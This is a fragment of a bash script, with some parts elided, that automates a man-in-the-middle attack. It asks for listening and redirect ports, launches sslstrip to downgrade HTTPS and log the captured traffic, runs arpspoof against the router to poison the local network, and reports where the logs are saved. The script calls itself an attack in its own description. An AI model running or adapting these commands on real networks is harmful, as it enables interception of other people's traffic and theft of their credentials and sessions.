...
echo -n "Enter a name for this network sniffer: "
read -e NET
...
echo ""
echo -n "Enter the port to be LISTENING: "
read -e dport

echo -n "Enter the port to be REDIRECT: "
read -e toport
echo ""

RUN=`netstat -tupan | grep $toport | head -1 | awk '{print $4}' | cut -d : -f 2`
...
nohup $SSLSTRIP -w ~/$SESSION/$NET -a -l $toport -f lock.ico &
nohup $ARPSPOOF -i $FACE $ROUTER &
sleep 1
echo ""
	echo "File logs here:-> /$HOME/$SESSION/$NET"
	exit 0;
#fi
	}
...
printf  '%s%*s%s \n' "$RED"
echo "Description:"
echo "Script the instant induction at man in the middle (Attack)"
echo ""
